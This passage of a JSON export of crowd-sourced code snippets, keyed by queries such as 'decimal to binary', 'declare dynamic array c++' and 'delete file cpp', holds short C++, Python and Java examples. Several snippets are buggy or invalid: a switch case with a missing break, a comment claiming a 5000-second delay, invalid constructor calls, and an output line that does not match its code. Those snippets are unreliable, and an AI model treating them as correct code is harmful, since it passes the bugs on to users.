    "description": "# Python program to convert decimal to binary       # Function to convert Decimal number   # to Binary number   def decimalToBinary(n):       return bin(n).replace(\"0b\", \"\")        # Driver code   if __name__ == '__main__':       print(decimalToBinary(8))       print(decimalToBinary(18))       print(decimalToBinary(7))        Output: 1000 1001\npublic class DecimalToBinaryExample2{     public static void toBinary(int decimal){          int binary[] = new int[40];          int index = 0;          while(decimal > 0){            binary[index++] = decimal%2;            decimal = decimal/2;          }          for(int i = index-1;i >= 0;i--){            System.out.print(binary[i]);          }     System.out.println();//new line   }     public static void main(String args[]){       System.out.println(\"Decimal of 10 is: \");   toBinary(10);     System.out.println(\"Decimal of 21 is: \");   toBinary(21);     System.out.println(\"Decimal of 31 is: \");     toBinary(31);   }}    \n#include <iostream> #include <stdlib.h>  int main () {     int i;     char buffer [33];     printf (\"Enter a number: \");     scanf (\"%d\",&i);     itoa (i,buffer,10);     printf (\"decimal: %s\\n\",buffer);     itoa (i,buffer,16);     printf (\"hexadecimal: %s\\n\",buffer);     itoa (i,buffer,2);     printf (\"binary: %s\\n\",buffer);     return 0; } \n# Python program to convert decimal to binary     # Function to convert Decimal number # to Binary number def decimalToBinary(n):     return bin(n).replace(\"0b\", \"\")     # Driver code if __name__ == '__main__':     print(decimalToBinary(8))     print(decimalToBinary(18))     print(decimalToBinary(7)) \n  std::string binary = std::bitset<8>(n).to_string(); \n//Java Solution for Decimal To Binary Conversion  import java.util.*; public class DecimalToBinary {  \tpublic static void main(String[] args) { \t\t// TODO Auto-generated method stub \t\tScanner sc = new Scanner(System.in); \t\tint dec = sc.nextInt(); \t\tStringBuffer sb = new StringBuffer(); \t\twhile(dec!=0) \t\t{ \t\t\tsb.append(dec%2); \t\t\tdec=dec/2; \t\t} \t\tSystem.out.println(sb.reverse()); \t\t \t}  } \n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1774,
    "keyword": null,
    "link": null,
    "title": " decimal to binary gfg",
    "description": " // C++ program to convert a decimal  // number to binary number     #include <iostream>  using namespace std;     // function to convert decimal to binary  void decToBinary(int n)  {      // array to store binary number      int binaryNum[32];         // counter for binary array      int i = 0;      while (n > 0) {             // storing remainder in binary array          binaryNum[i] = n % 2;          n = n / 2;          i++;      }         // printing binary array in reverse order      for (int j = i - 1; j >= 0; j--)          cout << binaryNum[j];  }     // Driver program to test above function  int main()  {      int n = 17;      decToBinary(n);      return 0;  } \n# Python program to convert decimal to binary     # Function to convert Decimal number # to Binary number def decimalToBinary(n):     return bin(n).replace(\"0b\", \"\")     # Driver code if __name__ == '__main__':     print(decimalToBinary(8))     print(decimalToBinary(18))     print(decimalToBinary(7)) \n  std::string binary = std::bitset<8>(n).to_string(); \n//Java Solution for Decimal To Binary Conversion  import java.util.*; public class DecimalToBinary {  \tpublic static void main(String[] args) { \t\t// TODO Auto-generated method stub \t\tScanner sc = new Scanner(System.in); \t\tint dec = sc.nextInt(); \t\tStringBuffer sb = new StringBuffer(); \t\twhile(dec!=0) \t\t{ \t\t\tsb.append(dec%2); \t\t\tdec=dec/2; \t\t} \t\tSystem.out.println(sb.reverse()); \t\t \t}  } \n# Function to convert decimal to binary # using built-in python function def decimalToBinary(n):     # converting decimal to binary     # and removing the prefix(0b)     return bin(n).replace(\"0b\", \"\")     # Driver code if __name__ == '__main__':     # calling function     # with decimal argument     print(decimalToBinary(77))\ndef decimalToBinary(n):     return bin(n).replace(\"0b\", \"\")     # Driver code if __name__ == '__main__':     print(decimalToBinary(8))     print(decimalToBinary(18))     print(decimalToBinary(7))\n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1775,
    "keyword": null,
    "link": null,
    "title": " decimal to binary predefined function",
    "description": "#include <iostream> #include <stdlib.h>  int main () {     int i;     char buffer [33];     printf (\"Enter a number: \");     scanf (\"%d\",&i);     itoa (i,buffer,10);     printf (\"decimal: %s\\n\",buffer);     itoa (i,buffer,16);     printf (\"hexadecimal: %s\\n\",buffer);     itoa (i,buffer,2);     printf (\"binary: %s\\n\",buffer);     return 0; } \n  std::string binary = std::bitset<8>(n).to_string(); \n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1776,
    "keyword": null,
    "link": null,
    "title": " decimal to english",
    "description": "#include<iostream> #include<string>  inline std::string binary_conv(int,int,std::string);  int main() {     long int number;     int base {27};     std::cout<<\"\\nPlease enter a non-negative integer:\\t\";     std::cin>>number;     while(number<=0)     {         std::cerr<<\"\\nWRONG!!!, Enter a number higher than zero\\n\";         std::cout<<\"\\nPlease enter a number\\t\";         std::cin>>number;     }     std::string binary_number;     binary_number = binary_conv(number,base,binary_number);               std::cout<<binary_number<<std::endl;         return 0 ; }  std::string binary_conv(int number, int base,std::string binary) {        std::string zero_one = \" abcdefghijklmnopqrstuvwxyz\";     if(number==0)         return binary;     binary = zero_one[number%base]+binary;     number/=base;     return binary_conv(number,base,binary); } \n#include<iostream> #include<string> #include<cmath>  int main() {            std::cout<<\"Please enter a string of small letters and spaces:\\t\";     std::string str ;     getline(std::cin, str) ;           long int  result {0};     long int  value {0};     for(int i=0 ; i < str.length(); ++i)     {          switch(str[i]){                      case ' ':                 value = 0;                 break;             case 'A':             case 'a':                 value = 1;                 break;             case 'B':             case 'b':                 value = 2;                 break;             case 'C':             case 'c':                 value = 3;                 break;             case 'D':             case 'd':                 value = 4;                 break;             case 'E':             case 'e':                 value = 5;                 break;             case 'F':             case 'f':                 value = 6;                 break;             case 'G':             case 'g':                 value = 7;                 break;             case 'H':             case 'h':                 value = 8;                 break;             case 'I':             case 'i':                 value = 9;                 break;             case 'J':             case 'j':                 value = 10;                 break;             case 'K':             case 'k':                 value = 11;                 break;             case 'L':             case 'l':                 value = 12;                 break;             case 'M':             case 'm':                 value = 13;                 break;             case 'N':             case 'n':                 value = 14;                 break;             case 'O':             case 'o':                 value = 15;             case 'P':             case 'p':                 value = 16;                 break;             case 'Q':             case 'q':                 value = 17;                 break;             case 'R':             case 'r':                 value = 18;                 break;             case 'S':             case 's':                 value = 19;                 break;             case 'T':             case 't':                 value = 20;                 break;             case 'U':             case 'u':                 value = 21;                 break;             case 'V':             case 'v':                 value = 22;                 break;             case 'W':             case 'w':                 value = 23;                 break;             case 'X':             case 'x':                 value = 24;                 break;             case 'Y':             case 'y':                 value = 25;                 break;             case 'Z':             case 'z':                 value = 26;                 break;             default:                 std::cout<<\" The input string does not represent a number in base 27 \"<<std::endl;         }          int power = (str.length()-1-i);         result += value*(pow(27,power));     }     if(str.length()>= 32)     {                    std::cout<<\"\\nThe input string represents a number that is greater than 2&circ;32\"<<std::endl;              }else{         std::cout<<\"\\n\"<<result<<std::endl;     }           return 0 ; }  \n#include<iostream> #include<string> #include<limits>  inline std::string binary_conv(int,int,std::string);  int main() {     long int number;     int base {27};     std::cout<<\"\\nPlease enter a non-negative integer:\\t\";     std::cin>>number;       while(1)     {         if(std::cin.fail())         {         std::cin.clear();         std::cin.ignore(std::numeric_limits<std::streamsize>::max(),'\\n');         std::cout<<\"\\nYou have entered wrong input!\"<<std::endl;         std::cout<<\"\\nPlease enter a non-negative integer:\\t\";         std::cin>>number;     }         if(!std::cin.fail())         break;     }          std::string binary_number;     binary_number = binary_conv(number,base,binary_number);               std::cout<<binary_number<<std::endl;         return 0 ; }  std::string binary_conv(int number, int base,std::string binary) {        std::string zero_one = \" abcdefghijklmnopqrstuvwxyz\";     if(number==0)         return binary;     binary = zero_one[number%base]+binary;     number/=base;     return binary_conv(number,base,binary); }   \n#include<iostream> #include<cmath>  #include<limits> #include<string> void print_value(const size_t value); // bool IllegalCharacters(int,const std::string, int); bool isalpha_isspace(const std::string&);   int main() {     std::string eng2dec;     std::cout<<\"\\nPlease enter a string of small letters and spaces:\\t\";     getline(std::cin,eng2dec);      // checking if string is an alphabet or spaces      bool answer = isalpha_isspace(eng2dec);     if(answer == false)     {         std::cout<<\"\\nThe input string does not represent a number in base 27\"<<std::endl;         exit(1);     }     // looping throught the string and converting the value of chars to decimal with base 27     size_t value {0};     int decimal {0};     for(size_t i {0}; i<eng2dec.length(); ++i)     {            if(eng2dec[i]==' ')         {             decimal=0;         }else{             int power = (eng2dec.length()-1-i);             decimal = eng2dec[i]%96;                value+= decimal*pow(27,power);          }         if(value > pow(2,32)){             std::cout<<\"\\nThe input string represents a number that is greater than 2&circ;32\" <<std::endl;exit(1);         }      }     print_value(value);       return 0 ; }  // check if string is not alphabet or space  bool isalpha_isspace(const std::string& str ) {        bool answer ;     for(char c: str){         if(isalpha(c) || isspace(c))          {            answer = true;         }else         {            answer= false;         }     }     return answer ; }  // print value  void print_value(const size_t value){ \tstd::cout<<value<<std::endl;          } \n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1777,
    "keyword": null,
    "link": null,
    "title": " decimal to hex cpp",
    "description": "// Pretty stright forward //  takes in input //  outputs it in hex  #include <iostream> using namespace std;  int main(){         float i;         cout << \"What is the number?: \";         cin  >> i;          int* q = (int*)&i;         cout << hex << *q << endl;          return 0; }\n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1778,
    "keyword": null,
    "link": null,
    "title": " decising how many numbers after comma c++",
    "description": "#include <iostream> #include <iomanip>  int main(int argc, char** argv) {     float testme[] = { 0.12345, 1.2345, 12.345, 123.45, 1234.5, 12345 };      std::cout << std::setprecision(2) << std::fixed;      for(int i = 0; i < 6; ++i)     {         std::cout << testme[i] << std::endl;     }      return 0; }\n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1779,
    "keyword": null,
    "link": null,
    "title": " declaration vs. definition cpp",
    "description": "\\\\this is the declaration int declaration();  \\\\this is the definition int definition = 0\n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1780,
    "keyword": null,
    "link": null,
    "title": " declare a tab c++",
    "description": "int tab[5] = {16, 2, 77, 40, 12071}; \n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1781,
    "keyword": null,
    "link": null,
    "title": " declare and define exception c++",
    "description": "// using standard exceptions #include <iostream> #include <exception> using namespace std;  class myexception: public exception {   virtual const char* what() const throw() {     return \"My exception happened\";   } } myex; // declare instance of \"myexception\" named \"myex\"  int main () {   try {     throw myex; // alternatively use: throw myexception();   } catch (exception& e) { // to be more specific use: (myexception& e)     cout << e.what() << '\\n';   }   return 0; }\n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1782,
    "keyword": null,
    "link": null,
    "title": " declare dynamic array c++",
    "description": "int main() {   int size;    std::cin >> size;    int *array = new int[size];    delete [] array;    return 0; }\nint* a = NULL;   // Pointer to int, initialize to nothing. int n;           // Size needed for array cin >> n;        // Read in the size a = new int[n];  // Allocate n ints and save ptr in a. for (int i=0; i<n; i++) {     a[i] = 0;    // Initialize all elements to zero. } . . .  // Use a as a normal array delete [] a;  // When done, free memory pointed to by a. a = NULL;     // Clear a to prevent using invalid memory reference. \n#include <iostream> #include <cstddef> // std::size_t   int main() {     std::cout << \"Enter a positive integer: \";     std::size_t length{};     std::cin >> length;       int *array{ new int[length]{} }; // use array new.  Note that length does not need to be constant!       std::cout << \"I just allocated an array of integers of length \" << length << '\\n';       array[0] = 5; // set element 0 to value 5       delete[] array; // use array delete to deallocate array       // we don't need to set array to nullptr/0 here because it's going to go out of scope immediately after this anyway       return 0; }\nint length = 50; int *array = new int[length](); // returns 50 length array of 0\n",
    "reg_date": "2021-10-12T11:39:41.000Z"
  },
  {
    "id": 1783,
    "keyword": null,
    "link": null,
    "title": " declare nullptr c++",
    "description": "int  *ptr = NULL;\n",
    "reg_date": "2021-10-12T11:39:42.000Z"
  },
  {
    "id": 1784,
    "keyword": null,
    "link": null,
    "title": " declare static table filled cpp",
    "description": "int intergerTable[6] = {1, 2, 3, 4, 5, 6};\n",
    "reg_date": "2021-10-12T11:39:42.000Z"
  },
  {
    "id": 1785,
    "keyword": null,
    "link": null,
    "title": " declare vector of size n in c++",
    "description": "// First include the vector library: #include <vector>  // The syntax to create a vector looks like this: std::vector<type> name;  // We can create & initialize \"lol\" vector with specific values: std::vector<double> lol = {66.666, -420.69};  // it would look like this: 66.666 | -420.69\n#include <vector>  auto n = 20 // create a vector with n=20 integer elements std::vector<int> arr(n);\n",
    "reg_date": "2021-10-12T11:39:42.000Z"
  },
  {
    "id": 1786,
    "keyword": null,
    "link": null,
    "title": " declare vectors c++",
    "description": "// First include the vector library: #include <vector>  // The syntax to create a vector looks like this: std::vector<type> name;  // We can create & initialize \"lol\" vector with specific values: std::vector<double> lol = {66.666, -420.69};  // it would look like this: 66.666 | -420.69\n vector<int> vec; //Creates an empty (size 0) vector    vector<int> vec(4); //Creates a vector with 4 elements.  /*Each element is initialised to zero. If this were a vector of strings, each string would be empty. */  vector<int> vec(4, 42);  /*Creates a vector with 4 elements. Each element is initialised to 42. */   vector<int> vec(4, 42); vector<int> vec2(vec);  /*The second line creates a new vector, copying each element from the vec into vec2. */\nstd::vector<type> name;\n",
    "reg_date": "2021-10-12T11:39:42.000Z"
  },
  {
    "id": 1787,
    "keyword": null,
    "link": null,
    "title": " declaring 2d dynamic array c++",
    "description": "int** a = new int*[rowCount]; for(int i = 0; i < rowCount; ++i)     a[i] = new int[colCount];\nint** arr = new int*[10]; // Number of Students int i=0, j; for (i; i<10; i++)  \tarr[i] = new int[5]; // Number of Courses /*In line[1], you're creating an array which can store the addresses   of 10 arrays. In line[4], you're allocating memories for the    array addresses you've stored in the array 'arr'. So it comes out    to be a 10 x 5 array. */\n",
    "reg_date": "2021-10-12T11:39:42.000Z"
  },
  {
    "id": 1788,
    "keyword": null,
    "link": null,
    "title": " declaring instance of class c++",
    "description": "#include <iostream>      using namespace std;  class Foo  {    public:    Foo ( )    {       cout << \"constructor Foo\\n\";    }                };  class Bar  {    public:    Bar ( Foo )    {       cout << \"constructor Bar\\n\";    } };  int main() {    /* 1 */ Foo* foo1 = new Foo ();    /* 2 */ Foo* foo2 = new Foo;    /* 3 */ Foo foo3;    /* 4 */ Foo foo4 = Foo::Foo();     /* 5 */ Bar* bar1 = new Bar ( *new Foo() );    /* 6 */ Bar* bar2 = new Bar ( *new Foo );    /* 7 */ Bar* bar3 = new Bar ( Foo foo5 );    /* 8 */ Bar* bar3 = new Bar ( Foo::Foo() );     return 1; } \nclass Rectangle {     int width, height;   public:     void set_values (int,int);     int area (void); } rect;\nMyClass* MyObject = new MyClass();\n",
    "reg_date": "2021-10-12T11:39:42.000Z"
  },
  {
    "id": 1789,
    "keyword": null,
    "link": null,
    "title": " declaring iterator in cpp",
    "description": "vector<int>::iterator ptr; \n",
    "reg_date": "2021-10-12T11:39:42.000Z"
  },
  {
    "id": 1790,
    "keyword": null,
    "link": null,
    "title": " declaring strings c++",
    "description": "std::string str = \"hello world\";  char *str = \"hello world\"; char str[] = \"hello world\";  char str[11] = \"hello world\"; \n",
    "reg_date": "2021-10-12T11:39:42.000Z"
  },
  {
    "id": 1791,
    "keyword": null,
    "link": null,
    "title": " decrement c++",
    "description": "int main(){   int i = 0;   cout << i << endl; //Outputs 0   i++; //Now i is 0 + 1   cout << i << endl; // Outputs 1   return 0; }\nint x = 5; x--; cout << x << endl; //outputs 4\n",
    "reg_date": "2021-10-12T11:39:42.000Z"
  },
  {
    "id": 1792,
    "keyword": null,
    "link": null,
    "title": " deep copy c++",
    "description": "// DEEP COPY class X { private:     int i;     int *pi; public:     X()         : pi(new int)     { }     X(const X& copy)   // <-- copy ctor         : i(copy.i), pi(new int(*copy.pi))  // <-- note this line in particular!     { } }; \n//SHALLOW COPY class X { private:     int i;     int *pi; public:     X()         : pi(new int)     { }     X(const X& copy)   // <-- copy ctor         : i(copy.i), pi(copy.pi)     { } }; \n",
    "reg_date": "2021-10-12T11:39:43.000Z"
  },
  {
    "id": 1793,
    "keyword": null,
    "link": null,
    "title": " default access modifier in c++ in struct",
    "description": "A structure is a class defined with the struct keyword.  Its members and base classes are public by default.    In practice, structs are typically reserved for data without functions.      When deriving a struct from a class/struct, default access-specifier for a base class/struct is public.\n",
    "reg_date": "2021-10-12T11:39:43.000Z"
  },
  {
    "id": 1794,
    "keyword": null,
    "link": null,
    "title": " default access specifier in c++",
    "description": "By default access to members of a C++ class is private.   The private members are not accessible outside the class;  they can be accessed only through methods of the class.   The public members form an interface to the class and  are accessible outside the class.\n",
    "reg_date": "2021-10-12T11:39:43.000Z"
  },
  {
    "id": 1795,
    "keyword": null,
    "link": null,
    "title": " default order in set in c++",
    "description": "ascending order\n6.29 include <iostream> #include <iomanip> using namespace std;  bool isPrimeHalf(int number) { \tfor (int i = 2; i <= number / 2; i++) \t\tif ((number % i) == 0) \t\t\treturn false; \treturn true; }  bool isPrimeRoot(int number) { \tfor (int i = 2; i <= sqrt(static_cast<float>(number)); i++) \t\tif ((number % i) == 0) \t\t\treturn false; \treturn true; }  int main() { \tcout << \"All primes between 2 and 1000 is: \" << endl; \tfor (int number = 2; number <= 100000; number++) \t{ \t\tif (isPrimeHalf(number)) \t\t\tcout << setw(8) << number; \t} \tcout << endl; \tcout << \"And now same with other function: \" << endl; \tfor (int number = 2; number <= 100000; number++) \t{ \t\tif (isPrimeHalf(number)) \t\t\tcout << setw(8) << number; \t} \tcout << endl;\n",
    "reg_date": "2021-10-12T11:39:43.000Z"
  },
  {
    "id": 1796,
    "keyword": null,
    "link": null,
    "title": " default rule of five c++",
    "description": "class X { public:    X() = default;        X(X const& other) = default;    X& operator=(X const& other) = default;        X(X&& other) = default;    X& operator=(X&& other) = default;        ~X() = default; };\n",
    "reg_date": "2021-10-12T11:39:43.000Z"
  },
  {
    "id": 1797,
    "keyword": null,
    "link": null,
    "title": " define c++",
    "description": "#include <iostream>     // macro definition  #define LIMIT 5   int main()  {      for (int i = 0; i < LIMIT; i++) {          std::cout << i << \"\\n\";      }         return 0;  } \n#define SPEED ios::sync_with_stdio(false); cin.tie(0); cout.tie(0) #define ar array #define ll long long #define pb push_back\n",
    "reg_date": "2021-10-12T11:39:43.000Z"
  },
  {
    "id": 1798,
    "keyword": null,
    "link": null,
    "title": " define for loop c++",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\nfor(initialization; condition ; increment/decrement) {    statement(s); }\n#define FOR(x,a,b) for(int x = a; x <= b; x++) #define FOD(x,a,b) for(int x = a; x >= b; x--) #define REP(x,a,b) for(int x = a; x < b; x++) #define RED(x,a,b) for(int x = a; x > b; x--)\n#include <iostream> #define FOR(i,a) for (int i = 0; i < a; i++)  FOR(i, 3) cout << i << endl;\nfor ( init; condition; increment ) {    statement(s); }\n",
    "reg_date": "2021-10-12T11:39:43.000Z"
  },
  {
    "id": 1799,
    "keyword": null,
    "link": null,
    "title": " define in cpp",
    "description": "#include <iostream>     // macro definition  #define LIMIT 5   int main()  {      for (int i = 0; i < LIMIT; i++) {          std::cout << i << \"\\n\";      }         return 0;  } \n#define SPEED ios::sync_with_stdio(false); cin.tie(0); cout.tie(0) #define ar array #define ll long long #define pb push_back\n// The #define preprocessor directive creates symbolic constants #include <iostream> using namespace std;  #define CONSTANT 2.71828  int main () {    cout << \"Declared constant: \" << CONSTANT << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:39:43.000Z"
  },
  {
    "id": 1800,
    "keyword": null,
    "link": null,
    "title": " define type c++",
    "description": "typedef unsigned int u_int; //giving 'unsigned int' a name of u_int\n",
    "reg_date": "2021-10-12T11:39:43.000Z"
  },
  {
    "id": 1801,
    "keyword": null,
    "link": null,
    "title": " define unicode c++",
    "description": "#define UNICODE  #define _UNICODE\n",
    "reg_date": "2021-10-12T11:39:44.000Z"
  },
  {
    "id": 1802,
    "keyword": null,
    "link": null,
    "title": " defining class in other file in c++",
    "description": "//ClassOne.hpp:  class ClassOne { public:   ClassOne(); // note, no function body           int method(); // no body here either private:   int member; }; //ClassOne.cpp:  #include \"ClassOne.hpp\"  // implementation of constructor ClassOne::ClassOne()  :member(0) {}  // implementation of \"method\" int ClassOne::method() {   return member++; } //main.cpp:  #include \"ClassOne.hpp\" // Bring the ClassOne declaration into \"view\" of the compiler  int main(int argc, char* argv[]) {   ClassOne c1;   c1.method();    return 0; }\n",
    "reg_date": "2021-10-12T11:39:44.000Z"
  },
  {
    "id": 1803,
    "keyword": null,
    "link": null,
    "title": " defining function in other file",
    "description": "//Your .h file.. #ifndef MY_HEADER #define MY_HEADER  int add(int, int); #endif   //main.cpp #include \"myHeader.h\"  int main() {   int result = add(1,2);   return 0; }  //file that contain definition of the functions... //.cpp #include \"myHeader.h\"  int add(int a, int b) {  return a+b; }\n",
    "reg_date": "2021-10-12T11:39:44.000Z"
  },
  {
    "id": 1804,
    "keyword": null,
    "link": null,
    "title": " deifine an object in C++",
    "description": "classname identifier; \n",
    "reg_date": "2021-10-12T11:39:44.000Z"
  },
  {
    "id": 1805,
    "keyword": null,
    "link": null,
    "title": " delay c++",
    "description": "//in Win32 #include<windows.h> Sleep(milliseconds);  //in Unix #include<unistd.h> unsigned int microsecond = 1000000; usleep(3 * microsecond); //sleeps for 3 seconds sleep(3);\n#include<windows.h> Sleep(milliseconds); \n",
    "reg_date": "2021-10-12T11:39:44.000Z"
  },
  {
    "id": 1806,
    "keyword": null,
    "link": null,
    "title": " delay millis arduino",
    "description": "int delay_ = 500;//my delay will be for 500 miliseconds int time_;//the name of the variable is time_ because there is a function already called time  void setup(){ time_ = millis(); }  void loop(){ if (millis() - time_ > delay_){ //your code here time_ = millis();\n",
    "reg_date": "2021-10-12T11:39:44.000Z"
  },
  {
    "id": 1807,
    "keyword": null,
    "link": null,
    "title": " delay without blocking",
    "description": "void millisdelay(long intervaltime) {   long thetimenow = millis();   while (millis() < thetimenow + intervaltime)   {     // nothing but wait   } } millisdelay(5000); // delay 5000 seconds\n",
    "reg_date": "2021-10-12T11:39:44.000Z"
  },
  {
    "id": 1808,
    "keyword": null,
    "link": null,
    "title": " delete 2d dynamic array c++",
    "description": "for (int i = 0; i < numRows; i++) {     delete [] world[i]; //    world[i] = 0;  // <- don't have to do this } delete [] world;  // <- because they won't exist anymore after this world = 0;\n",
    "reg_date": "2021-10-12T11:39:44.000Z"
  },
  {
    "id": 1809,
    "keyword": null,
    "link": null,
    "title": " delete a head node in link list",
    "description": "void deleteNode(Node *head) {     Node* temp=head;     if(head!=NULL)     {         head=head->next;         delete temp;     } }\n",
    "reg_date": "2021-10-12T11:39:44.000Z"
  },
  {
    "id": 1810,
    "keyword": null,
    "link": null,
    "title": " delete an array c++",
    "description": "// Delete pointer int* ptr1 = new int; delete ptr1;  // Delete array int* array = new int[10]; delete[] array;  \ndelete myarray[elemen];\n// operator delete[] example // an advanced example : #include <iostream>   using namespace std;  struct MyClass {   MyClass() {cout <<\"MyClass constructed\\n\";}   ~MyClass() {cout <<\"MyClass destroyed\\n\";} };  int main () {   MyClass * pt;    pt = new MyClass[3];   delete[] pt;    return 0; } //simple exmaple : int main () {   int * pt;    pt = new int [3];   delete[] pt;    return 0; }\n",
    "reg_date": "2021-10-12T11:39:44.000Z"
  },
  {
    "id": 1811,
    "keyword": null,
    "link": null,
    "title": " delete and search edge in adjacency matrix of a graph",
    "description": "/*adjacency matrix implementation of directed graph:  0---->1---|  |         |---->4  |-> 2-->3-|*/ #include <iostream>  using namespace std; #define v 5 void inti(int mat[][v]) {     for(int i=0;i<v;i++)     {         for(int j=0;j<v;j++)         {             mat[i][j]=0;         }     } } void addedge(int mat[][v],int start,int endvertix) {     mat[start][endvertix]=1; } void check(int mat[][v],int start,int endvertix) {     if(mat[start][endvertix]==1)     {         cout<<\"edge exists:\"<<endl;     }     else     {         cout<<\"edge does not exist:\"<<endl;     }  } void removeedge(int mat[][v],int start,int edgeend) {     mat[start][edgeend]=0; } void printmat(int mat[][v]) {     for(int i=0;i<v;i++)     {         for(int j=0;j<v;j++)         {             cout<<mat[i][j]<<\" \";         }         cout<<endl;      } }  int main() {     int array_in_graph[v][v];     inti(array_in_graph);     addedge(array_in_graph,0,1);     addedge(array_in_graph,0,2);     addedge(array_in_graph,0,3);     addedge(array_in_graph,1,3);     addedge(array_in_graph,1,4);     addedge(array_in_graph,2,3);     addedge(array_in_graph,3,4);     printmat(array_in_graph);     cout<<\"now above graph is not consider as we will remove edge '3->4' AND edge '1->3':\"<<endl;     removeedge(array_in_graph,3,4);     removeedge(array_in_graph,1,3);     printmat(array_in_graph);     check(array_in_graph,1,4);     check(array_in_graph,3,4);     return 0; } \n",
    "reg_date": "2021-10-12T11:39:45.000Z"
  },
  {
    "id": 1812,
    "keyword": null,
    "link": null,
    "title": " delete custome index from array c++",
    "description": "\tconst int SIZE = 9; \tint arr[SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \t \tcout << \"Enter Index U want to delete:\\n\"; \tint del; \tcin >> del; \tfor (int i = del-1; i < SIZE; i++) \t{ \t\tarr[del] = arr[del + 1]; \t\tdel++; \t} \tfor (int i = 0; i < SIZE - 1; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\n",
    "reg_date": "2021-10-12T11:39:45.000Z"
  },
  {
    "id": 1813,
    "keyword": null,
    "link": null,
    "title": " delete dynamic array c++",
    "description": "// Delete pointer int* ptr1 = new int; delete ptr1;  // Delete array int* array = new int[10]; delete[] array;  \nint length = 69; int * numbers = new int[length]; delete[] numbers;\nint* v=new int[10];  // Creating a dynamic array  delete[] v; // delete the dynamic array  v=nullptr; //recommended\n",
    "reg_date": "2021-10-12T11:39:45.000Z"
  },
  {
    "id": 1814,
    "keyword": null,
    "link": null,
    "title": " delete file cpp",
    "description": "/* remove example: remove myfile.txt */ #include <stdio.h>  int main () {   if( remove( \"myfile.txt\" ) != 0 )     perror( \"Error deleting file\" );   else     puts( \"File successfully deleted\" );   return 0; }\nstd::remove(\"location here Trump#4380\");\n",
    "reg_date": "2021-10-12T11:39:45.000Z"
  },
  {
    "id": 1815,
    "keyword": null,
    "link": null,
    "title": " delete files c++",
    "description": "#include <stdio.h>  int main () {   if( remove( \"myfile.txt\" ) != 0 )     perror( \"Error deleting file\" );   else     puts( \"File successfully deleted\" );   return 0; }\nstd::remove(\"location here Trump#4380\");\n",
    "reg_date": "2021-10-12T11:39:45.000Z"
  },
  {
    "id": 1816,
    "keyword": null,
    "link": null,
    "title": " delete from front in vector c++",
    "description": "vector.erase( vector.begin() + 3 ); // Deleting the fourth element\n// Deleting first element vector_name.erase(vector_name.begin());  // Deleting xth element from start vector_name.erase(vector_name.begin()+(x-1));  // Deleting from the last vector_name.pop_back();\n",
    "reg_date": "2021-10-12T11:39:45.000Z"
  },
  {
    "id": 1817,
    "keyword": null,
    "link": null,
    "title": " delete heap array c",
    "description": "int* t = new int[10](); delete [] t;\n",
    "reg_date": "2021-10-12T11:39:45.000Z"
  },
  {
    "id": 1818,
    "keyword": null,
    "link": null,
    "title": " delete index from array c++",
    "description": "\tconst int SIZE = 9; \tint arr[SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \t \tcout << \"Enter Index U want to delete:\\n\"; \tint del; \tcin >> del; \tfor (int i = del-1; i < SIZE; i++) \t{ \t\tarr[del] = arr[del + 1]; \t\tdel++; \t} \tfor (int i = 0; i < SIZE - 1; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\n",
    "reg_date": "2021-10-12T11:39:45.000Z"
  },
  {
    "id": 1819,
    "keyword": null,
    "link": null,
    "title": " delete last char of string C++",
    "description": "st = myString.substr(0, myString.size()-1); \n",
    "reg_date": "2021-10-12T11:39:45.000Z"
  },
  {
    "id": 1820,
    "keyword": null,
    "link": null,
    "title": " delete middle element of a stack using recursion",
    "description": "#include <bits/stdc++.h>  using namespace std; void solve(stack<int>&s,int k) {    if(k==1)    {        s.pop();        return;    }    int temp=s.top();    s.pop();    solve(s,k-1);    s.push(temp); } int main() {     stack<int>s;     int n;     cin>>n;     for(int i=0;i<n;i++)     {         int a;         cin>>a;         s.push(a);     }     int mid=(s.size()/2)+1;     solve(s,mid);     while(!s.empty())     {         cout<<s.top()<<\" \";         s.pop();     }     return 0; } \n",
    "reg_date": "2021-10-12T11:39:45.000Z"
  },
  {
    "id": 1821,
    "keyword": null,
    "link": null,
    "title": " delete one specific character in string C++",
    "description": "#include <algorithm> str.erase(std::remove(str.begin(), str.end(), 'a'), str.end()); \n",
    "reg_date": "2021-10-12T11:39:46.000Z"
  },
  {
    "id": 1822,
    "keyword": null,
    "link": null,
    "title": " delete specific vector element c++",
    "description": "#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\n",
    "reg_date": "2021-10-12T11:39:46.000Z"
  },
  {
    "id": 1823,
    "keyword": null,
    "link": null,
    "title": " deletion in a binary search tree",
